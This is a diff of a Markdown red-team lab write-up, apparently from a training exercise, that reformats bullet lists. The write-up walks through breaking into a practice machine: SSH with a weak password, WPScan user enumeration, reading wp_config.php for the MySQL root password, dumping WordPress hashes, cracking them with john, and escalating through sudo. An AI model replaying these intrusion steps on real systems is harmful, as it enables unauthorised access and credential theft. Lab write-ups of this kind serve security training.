@@ -53,9 +53,9 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
 
 
-
-      -Password:michael
-      - SSH in michael: ssh michael@192.168.1.110
+- Command:
+      - password:michael
+      - ssh in michael: ssh michael@192.168.1.110
       - cd var/www/html
       - ls -l
       - nano service.html (Flag1 located) 
@@ -71,7 +71,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
       - Used WPScan to enumerate users of the Target 1 WordPress site
       - Used password from previous Brute Force
       - Password: michael
- - Command:     
+ - Commands:     
       - ssh michael@192.168.1.110
       - cd var/www
       - ls 
@@ -85,7 +85,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 **Exploit Used**
      -Same exploits used to gain Flag 1 and 2:
         - Accessing MySQL Database
--Commands
+- Commands:
 	- cd /var/www/html/wordpress
 	- cat wp_config.php
 	- mysql -u root -p’R@v3nSecurity’ 
@@ -111,7 +111,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
      - Used Python to gain root privileges.
      - User credentials are stored in the ‘wp_users table’ in the wordpress database.
      - I copied/saved the usernames and password hashes to my Kali machine in a file named wp_hashes.txt.
--Commands:
+- Commands:
 	- mysql -u root -p’R@v3nSecurity’ 
 	- show databases;
 	- use wordpress;
@@ -121,7 +121,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 ![redteam14](https://user-images.githubusercontent.com/91024338/143157919-218bf1ae-63f2-4b22-80a1-ac2fc98b7226.JPG)
 
  
--Commands:
+- Commands:
 	- cd /usr/share/wordlist
 	- john --wordlist=rockyou.txt wp_hashes.txt
  
@@ -130,11 +130,11 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
 
  
--Results: 
--Steven’s password: pink84
+- Results: 
+        - Steven’s password: pink84
  
 - After I cracked Steven’s password I SSH as Steven, checked for root privileges and escalated to root with Python.
--Commands:
+- Commands:
 	- ssh steven@192.168.1.110
 	- password: pink84
 	- sudo -l
